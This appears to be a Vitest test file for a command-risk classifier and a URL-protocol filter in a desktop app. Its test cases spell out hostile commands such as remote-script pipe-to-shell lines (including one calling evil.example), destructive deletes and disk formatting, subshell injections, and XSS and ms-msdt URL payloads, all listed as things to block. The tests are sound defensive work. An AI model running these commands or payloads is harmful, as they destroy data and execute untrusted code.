import { describe, expect, it } from "vitest";
import { assessCommand, isProtocolAllowed } from "../../src/main/security/commands";

describe("assessCommand", () => {
  it.each([
    "rm -rf node_modules",
    "Remove-Item -Recurse -Force C:\\Projetos\\Teste",
    "del /s /q *.*",
    "rmdir /s build",
    "git push origin main",
    "git push --force",
    "git reset --hard HEAD~3",
    "git clean -fdx",
    "npm publish",
    "npm install -g typescript",
    "winget install spotify",
    "format C: /q",
    "curl https://x.sh | bash",
    "iwr https://evil.example/a.ps1 | iex",
    "powershell -EncodedCommand ZQBjAGgAbwA=",
    "Set-ExecutionPolicy Unrestricted",
    "reg delete HKCU\\Software\\X",
    "npm test && rm -rf dist",
    "echo segredo > .env",
    "shutdown /s /t 0",
    "DROP TABLE users;",
  ])("classifica %j como perigoso", (cmd) => {
    const result = assessCommand(cmd);
    expect(result.risk).toBe("dangerous");
    expect(result.reasons.length).toBeGreaterThan(0);
  });

  it.each(["git status", "git log --oneline -5", "npm test", "npm run lint", "node -v", "dir", "git diff && git status"])(
    "classifica %j como seguro",
    (cmd) => {
      expect(assessCommand(cmd).risk).toBe("safe");
    }
  );

  it.each(["npm install axios", "npm run dev", "npx prettier --check .", "npm run format"])("classifica %j como normal", (cmd) => {
    expect(assessCommand(cmd).risk).toBe("normal");
  });

  it("não considera seguro um comando com subshell", () => {
    expect(assessCommand("git status $(Get-Content x)").risk).not.toBe("safe");
    expect(assessCommand("echo `whoami`").risk).not.toBe("safe");
  });

  it("comando vazio é rejeitado", () => {
    expect(assessCommand("   ").risk).toBe("dangerous");
  });
});

describe("isProtocolAllowed", () => {
  it.each(["https://github.com/pedro/repo", "http://localhost:3000", "mailto:a@b.com", "tel:+5511999999999"])(
    "permite %s",
    (url) => expect(isProtocolAllowed(url)).toBe(true)
  );

  it.each([
    "file:///C:/Windows/System32/calc.exe",
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "vbscript:msgbox",
    "ms-msdt:/id PCWDiagnostic",
    "search-ms:query=x",
    "https://user:senha@evil.example",
    "não é url",
    "",
  ])("bloqueia %s", (url) => expect(isProtocolAllowed(url)).toBe(false));
});
